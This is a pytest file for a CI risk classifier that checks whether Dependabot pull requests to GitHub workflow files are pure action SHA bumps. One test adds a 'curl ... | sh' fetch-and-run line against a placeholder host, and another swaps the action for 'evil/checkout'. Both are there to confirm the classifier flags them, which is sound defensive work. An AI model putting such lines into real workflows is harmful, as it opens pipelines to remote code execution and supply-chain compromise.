"""Tests for scripts/risk_classify.py: the Dependabot workflow exemption checks the diff."""

from __future__ import annotations

from risk_classify import DEFAULT_PATTERNS, classify, load_patterns

PATTERNS = load_patterns(DEFAULT_PATTERNS)
BOT = "dependabot[bot]"
WF = ".github/workflows/ci.yml"
OLD = "3d3c42e5aac5ba805825da76410c181273ba90b1"
NEW = "0123456789abcdef0123456789abcdef01234567"

SHA_BUMP = f"""@@ -23,7 +23,7 @@ jobs:
     steps:
-      - uses: actions/checkout@{OLD} # v7.0.1
+      - uses: actions/checkout@{NEW} # v7.0.2
         with:
@@ -40,3 +40,3 @@
       - name: Keep the report
-        uses: actions/upload-artifact@{OLD} # v7.0.2
+        uses: actions/upload-artifact@{NEW} # v7.1.0
         with:"""


def test_dependabot_pure_uses_sha_bump_is_standard() -> None:
    result = classify([WF], PATTERNS, BOT, {WF: SHA_BUMP})
    assert result["risk"] == "standard"


def test_dependabot_app_login_is_also_recognised() -> None:
    assert classify([WF], PATTERNS, "app/dependabot", {WF: SHA_BUMP})["risk"] == "standard"


def test_dependabot_added_run_line_is_high() -> None:
    patch = SHA_BUMP + "\n+      - run: curl https://example.invalid | sh"
    assert classify([WF], PATTERNS, BOT, {WF: patch})["risk"] == "high"


def test_dependabot_removed_non_uses_line_is_high() -> None:
    patch = SHA_BUMP + "\n-        if: failure()"
    assert classify([WF], PATTERNS, BOT, {WF: patch})["risk"] == "high"


def test_dependabot_missing_patch_is_high() -> None:
    assert classify([WF], PATTERNS, BOT, {WF: None})["risk"] == "high"
    assert classify([WF], PATTERNS, BOT, {})["risk"] == "high"
    assert classify([WF], PATTERNS, BOT)["risk"] == "high"


def test_dependabot_empty_patch_is_high() -> None:
    assert classify([WF], PATTERNS, BOT, {WF: ""})["risk"] == "high"


def test_dependabot_swapping_the_action_is_high() -> None:
    patch = f"-      - uses: actions/checkout@{OLD} # v7.0.1\n+      - uses: evil/checkout@{NEW} # v7.0.2"
    assert classify([WF], PATTERNS, BOT, {WF: patch})["risk"] == "high"


def test_dependabot_tag_instead_of_sha_is_high() -> None:
    patch = f"-      - uses: actions/checkout@{OLD} # v7.0.1\n+      - uses: actions/checkout@v7 # v7.0.2"
    assert classify([WF], PATTERNS, BOT, {WF: patch})["risk"] == "high"


def test_dependabot_uses_line_without_version_comment_is_high() -> None:
    patch = f"-      - uses: actions/checkout@{OLD} # v7.0.1\n+      - uses: actions/checkout@{NEW}"
    assert classify([WF], PATTERNS, BOT, {WF: patch})["risk"] == "high"


def test_dependabot_standalone_comment_line_is_high() -> None:
    patch = SHA_BUMP + "\n+      # v7.1.0"
    assert classify([WF], PATTERNS, BOT, {WF: patch})["risk"] == "high"


def test_dependabot_subpath_action_bump_is_standard() -> None:
    patch = (
        f"-      - uses: github/codeql-action/init@{OLD} # v3.1.0\n"
        f"+      - uses: github/codeql-action/init@{NEW} # v3.2.0"
    )
    assert classify([WF], PATTERNS, BOT, {WF: patch})["risk"] == "standard"


def test_dependabot_one_bad_file_makes_the_pr_high() -> None:
    other = ".github/workflows/deploy.yml"
    patches = {WF: SHA_BUMP, other: "+      - run: echo hi"}
    assert classify([WF, other], PATTERNS, BOT, patches)["risk"] == "high"


def test_dependabot_non_workflow_high_path_is_high() -> None:
    assert classify(["Makefile"], PATTERNS, BOT, {"Makefile": SHA_BUMP})["risk"] == "high"


def test_dependabot_lockfile_only_is_standard() -> None:
    assert classify(["uv.lock"], PATTERNS, BOT, {"uv.lock": "+x"})["risk"] == "standard"


def test_non_dependabot_workflow_change_is_high_whatever_the_patch() -> None:
    assert classify([WF], PATTERNS, "johnniepmw", {WF: SHA_BUMP})["risk"] == "high"
    assert classify([WF], PATTERNS, "", None)["risk"] == "high"


def test_non_dependabot_classification_is_unchanged() -> None:
    files = ["src/tradingbot/domain/strategy.py", "docs/x.md", "Makefile"]
    with_patches = classify(files, PATTERNS, "someone", {f: "+x" for f in files})
    assert with_patches == classify(files, PATTERNS, "someone")
    assert with_patches["risk"] == "high"
    assert classify(["docs/x.md"], PATTERNS, "someone")["risk"] == "standard"
